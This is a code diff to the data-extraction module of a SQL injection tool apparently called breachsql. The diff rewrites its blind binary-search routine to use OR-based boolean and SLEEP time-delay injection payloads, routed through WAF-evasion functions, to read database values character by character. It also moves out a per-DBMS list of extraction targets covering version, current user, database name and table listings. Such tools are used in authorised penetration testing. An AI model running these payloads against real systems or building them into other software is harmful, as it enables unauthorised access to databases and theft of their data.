@@ -35,12 +35,13 @@ from __future__ import annotations
 import time
 from typing import Any, Dict, List, Optional
 
+from commonhuman_payloads.sqli import get_extraction_targets  # noqa: F401 (re-exported)
 from ..log import get_logger
 from ..http.injector import Injector
 from ..http.waf_detect import EVASION_NONE
 from .options import ScanOptions
 from .payloads import apply_evasion
-from .active import _fetch, _diff_score, _len_ratio, _has_stable_boolean_signal
+from .active import _fetch, _diff_score, _len_ratio
 from .blind import _timed_fetch
 
 logger = get_logger("breachsql.extract")
@@ -119,7 +120,6 @@ def extract_value(
         nonprint_streak = 0
         ch = chr(ordinal)
         result_chars.append(ch)
-        logger.debug("extract_value: pos=%d ord=%d char=%r", pos, ordinal, ch)
 
     return "".join(result_chars)
 
@@ -151,16 +151,10 @@ def _binary_search_char(
     path_index = surface.get("path_index", 0)
     second_url = getattr(opts, "second_url", "")
 
-    lo, hi = _ASCII_MIN - 1, _ASCII_MAX + 1  # inclusive search range [lo+1, hi-1]
+    lo, hi = 0, _ASCII_MAX + 1  # lo=0 so ASCII('')=0 converges to ordinal 1 (end-of-string)
 
     while lo + 1 < hi:
         mid = (lo + hi) // 2
-        # TRUE payload: ASCII(SUBSTRING(expr, pos, 1)) > mid
-        true_payload  = f"' AND {ord_fn}({substr_fn}(({expr}),{pos},1))>{mid}-- -"
-        false_payload = f"' AND {ord_fn}({substr_fn}(({expr}),{pos},1))>{hi}-- -"  # always false
-
-        true_pl  = apply_evasion(true_payload,  evasion)
-        false_pl = apply_evasion(false_payload, evasion)
 
         if mode == "time":
             # Time-blind: if condition is true, the delay fires.
@@ -188,8 +182,12 @@ def _binary_search_char(
                     f" (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<1000000) SELECT x FROM r)) ELSE 1 END)=1-- -"
                 )
             else:
-                # MySQL / MariaDB / auto: IF(cond, SLEEP(n), 0)
-                time_true_pl = f"' AND IF({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid},SLEEP({delay}),0)-- -"
+                # MySQL / MariaDB / auto: OR scalar subquery avoids the missing-row
+                # problem — SLEEP fires once even when base record doesn't exist.
+                time_true_pl = (
+                    f"' OR (SELECT IF({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid}"
+                    f",SLEEP({delay}),0))-- -"
+                )
             time_true_pl = apply_evasion(time_true_pl, evasion)
             elapsed = _timed_fetch(
                 injector, url, method, params, param, time_true_pl,
@@ -199,38 +197,23 @@ def _binary_search_char(
                 return None
             condition_true = elapsed >= opts.time_threshold
         else:
-            # Boolean-blind
-            resp_true  = _fetch(injector, url, method, params, param, true_pl,
+            # Boolean-blind: OR-based single probe compared against baseline.
+            # OR fires regardless of whether the base record exists, matching
+            # the boolean-detection payloads that confirmed this channel.
+            # Condition true  → all rows returned → response differs from baseline.
+            # Condition false → no rows (base record absent) → same as baseline.
+            probe_payload = f"' OR {ord_fn}({substr_fn}(({expr}),{pos},1))>{mid}-- -"
+            probe_pl = apply_evasion(probe_payload, evasion)
+
+            resp_probe = _fetch(injector, url, method, params, param, probe_pl,
                                 second_url=second_url, json_body=json_body,
                                 path_index=path_index)
-            resp_false = _fetch(injector, url, method, params, param, false_pl,
-                                second_url=second_url, json_body=json_body,
-                                path_index=path_index)
-
-            if resp_true is None or resp_false is None:
+            if resp_probe is None:
                 return None
 
-            score = _diff_score(resp_true, resp_false)
-            len_r = _len_ratio(resp_true, resp_false)
-            stable = _has_stable_boolean_signal(baseline, resp_true, resp_false)
-
-            # If there is NO signal at all between the "true" and "false" probes,
-            # the boolean channel is unreliable for this position — abort.
-            has_any_signal = (
-                score >= _DIFF_THRESHOLD
-                or len_r >= _LEN_RATIO_THRESHOLD
-                or stable
-            )
-            # Additionally check: does the "false" probe (always-false by construction)
-            # differ from baseline?  If neither probe differs from baseline, signal is dead.
-            false_vs_baseline_score = _diff_score(baseline, resp_false)
-            true_vs_baseline_score  = _diff_score(baseline, resp_true)
-
-            if not has_any_signal and false_vs_baseline_score < _DIFF_THRESHOLD:
-                # No distinguishable signal — cannot determine this character.
-                return None
-
-            condition_true = has_any_signal
+            score = _diff_score(resp_probe, baseline)
+            len_r = _len_ratio(resp_probe, baseline)
+            condition_true = score >= _DIFF_THRESHOLD or len_r >= _LEN_RATIO_THRESHOLD
 
         if condition_true:
             lo = mid   # ordinal > mid, so search upper half
@@ -241,66 +224,3 @@ def _binary_search_char(
     if ordinal < _ASCII_MIN or ordinal > _ASCII_MAX:
         return ordinal  # caller handles out-of-range (end of string / NULL)
     return ordinal
-
-
-# ---------------------------------------------------------------------------
-# Per-DBMS extraction targets
-# ---------------------------------------------------------------------------
-
-def get_extraction_targets(dbms: str) -> List[tuple[str, str]]:
-    """
-    Return a list of (label, sql_expr) pairs to extract for the given DBMS.
-
-    These are ordered from cheapest/most useful to most expensive.
-    Each expression must be a scalar SQL expression that returns a single
-    string value (suitable for wrapping in ASCII(SUBSTRING(...))).
-    """
-    dbms = (dbms or "").lower()
-
-    if dbms == "mysql" or dbms == "mariadb":
-        return [
-            ("version",          "VERSION()"),
-            ("current_user",     "CURRENT_USER()"),
-            ("current_database", "DATABASE()"),
-            ("tables",
-             "(SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') "
-             "FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)"),
-        ]
-    elif dbms == "mssql":
-        return [
-            ("version",          "CAST(@@version AS VARCHAR(512))"),
-            ("current_user",     "SYSTEM_USER"),
-            ("current_database", "DB_NAME()"),
-            ("tables",
-             "(SELECT STRING_AGG(table_name,',') FROM information_schema.tables "
-             "WHERE table_type='BASE TABLE')"),
-        ]
-    elif dbms == "postgresql":
-        return [
-            ("version",          "VERSION()"),
-            ("current_user",     "CURRENT_USER"),
-            ("current_database", "CURRENT_DATABASE()"),
-            ("tables",
-             "(SELECT STRING_AGG(table_name,',' ORDER BY table_name) "
-             "FROM information_schema.tables WHERE table_schema='public')"),
-        ]
-    elif dbms == "sqlite":
-        return [
-            ("version",          "sqlite_version()"),
-            ("tables",
-             "(SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table')"),
-        ]
-    elif dbms == "oracle":
-        return [
-            ("version",       "(SELECT banner FROM v$version WHERE rownum=1)"),
-            ("current_user",  "(SELECT USER FROM DUAL)"),
-            ("tables",
-             "(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) "
-             "FROM user_tables)"),
-        ]
-    else:
-        # Generic fallback — VERSION() works on MySQL, PostgreSQL, MariaDB
-        return [
-            ("version",      "VERSION()"),
-            ("current_user", "CURRENT_USER"),
-        ]
